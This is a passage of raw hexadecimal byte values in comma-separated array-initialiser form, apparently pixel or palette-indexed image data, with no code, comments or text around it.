0xE4, 0xE4, 0xE4, 0xE4, 0xE3, 0x12, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE1,
0xE0, 0xC9, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF,
0xDF, 0xDF, 0xDF, 0xF6, 0x16, 0x07, 0x1B, 0x1B, 0x07, 0x19, 0x16, 0x14, 0xF6, 0xE0, 0xF7, 0xF7,
0xE2, 0xE2, 0x14, 0x98, 0x98, 0x99, 0x9A, 0x17, 0x17, 0x17, 0xE4, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE3, 0xE3, 0xE2, 0x13, 0x13, 0x13, 0xCA, 0xCA,
0x12, 0x12, 0x12, 0xCA, 0xE3, 0x14, 0xCA, 0x11, 0x11, 0x12, 0xE0, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x13, 0xE4, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCE,
0xCE, 0x13, 0xE3, 0xE3, 0x13, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE0,
0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xE2, 0x14, 0x16, 0x19, 0x19, 0xAE,
0xF7, 0xE0, 0xF7, 0xF7, 0xE0, 0xAE, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18,
0x17, 0x17, 0x16, 0x99, 0x08, 0x9A, 0x17, 0x16, 0x16, 0x08, 0x13, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCA, 0xE5, 0xE3, 0xE2, 0xE3, 0xE4, 0xE4, 0xE4, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0x12, 0x11, 0x12, 0x12, 0x12, 0x13, 0x14, 0xE3, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x14, 0xE3, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xCF, 0xE3, 0xE2, 0x12, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0x14, 0x18, 0x07, 0x1C, 0x1C, 0x1C, 0x1C, 0x18,
0xE2, 0xE0, 0xE0, 0xE0, 0xE1, 0x14, 0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x99, 0x08, 0x14, 0xE3,
0xE3, 0x14, 0x08, 0x08, 0x9C, 0x17, 0x08, 0xE3, 0x14, 0x14, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0x14, 0x14, 0x13, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0xE3, 0x13, 0x13, 0x13, 0xCE, 0xCA, 0xCF, 0x12, 0x12,
0x12, 0x13, 0xE3, 0x13, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xDF, 0xDF,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xDF, 0xE0, 0xDF, 0xC8, 0xC8, 0xC8, 0xDF, 0xE0, 0x98, 0x07, 0x1C, 0x1C, 0x1C, 0x1B, 0x19, 0x17,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08,
0x99, 0x08, 0x08, 0x14, 0x14, 0xE4, 0xE3, 0xE5, 0x14, 0xE6, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCA, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14,
0x08, 0x08, 0x08, 0x08, 0xE4, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0xC9, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE3, 0xE5, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0xE3, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE0, 0xDF,
0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0x80, 0x98, 0x17, 0x18, 0x18, 0x07,
0x07, 0x19, 0x98, 0xDF, 0xDF, 0xDF, 0xDF, 0xF7, 0x98, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19,
0x18, 0x18, 0x17, 0x16, 0x9A, 0x99, 0x08, 0x14, 0xE3, 0xE1, 0xC9, 0x12, 0x12, 0x13, 0x14, 0x08,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x9A, 0x08, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x13, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0x13, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0xE5, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0xC8, 0x12,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8,
0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC8, 0xC8, 0xC8,
0xC8, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0x99, 0x07, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B,
0x18, 0xAF, 0xF6, 0xDF, 0xE0, 0xE0, 0xE0, 0xF7, 0x14, 0x98, 0x08, 0x14, 0x14, 0x14, 0xE2, 0xE2,
0xE1, 0xE1, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0xE2, 0x12, 0x11, 0x11, 0x11, 0x12, 0x14, 0x16, 0x16,
0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x14, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE3, 0x14, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xE0,
0x14, 0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xE0, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8,
0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xE0, 0xE2, 0x81, 0x16, 0x17, 0x19,
0x07, 0x17, 0xE1, 0xC8, 0xC8, 0xC9, 0xC9, 0xE0, 0x99, 0x07, 0x1C, 0x1B, 0x1B, 0x1B, 0x07, 0x19,
0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0xAE, 0x08, 0x14, 0x14, 0xE2, 0xE1, 0xC9, 0xC9, 0xC8, 0xC8,
0xC8, 0x12, 0x12, 0x12, 0xC8, 0xC9, 0xE0, 0xC9, 0x11, 0x11, 0x11, 0x11, 0xE1, 0x08, 0x9B, 0x9B,
0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x08, 0x13, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0x13, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0xE3, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x14,
0x14, 0x14, 0x08, 0x14, 0x08, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xE2, 0xE3, 0xE1, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xC8, 0xC9, 0xC8,
0xC8, 0xC8, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0x98, 0x19, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x19, 0x98, 0xE0, 0xE0, 0xE0, 0xE1, 0xE2, 0x14, 0x17, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x16, 0x98, 0x14, 0xF5, 0xE1, 0xDF, 0xC9, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xE4, 0x99, 0x9B, 0x9B,
0x16, 0x16, 0x16, 0x9B, 0x9B, 0x16, 0x16, 0x08, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0xE2, 0x14, 0x14, 0x14, 0xE4, 0x13, 0xCE, 0xCE, 0x13, 0xCE, 0x13,
0xE6, 0xE5, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x13, 0x08,
0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xC8, 0xC8, 0xC9, 0xE0, 0xE1, 0xE1, 0xE2, 0xE1, 0xE0, 0xC8, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xDF, 0xC8, 0xC8, 0xC9, 0xE1, 0x14, 0x99, 0x17,
0x18, 0x18, 0x14, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0x98, 0x19, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x07,
0x17, 0x98, 0x98, 0xAF, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE2, 0xE1, 0xE0, 0xE0, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE0, 0xE1, 0x14, 0x08, 0x9B, 0x9B,
0x9B, 0x16, 0x16, 0x9B, 0x9B, 0x16, 0x9A, 0xE4, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0xE2, 0xE2, 0x13, 0x13, 0xE2, 0xE3, 0x13, 0xCE, 0x13, 0xCE, 0xCE,
0xE6, 0xE4, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x14, 0x14,
0xE6, 0xE6, 0xE6, 0xE6, 0xCE, 0xCE, 0xCE, 0xCE, 0xE5, 0xE4, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE2,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x00, 0x11, 0x11, 0x11,
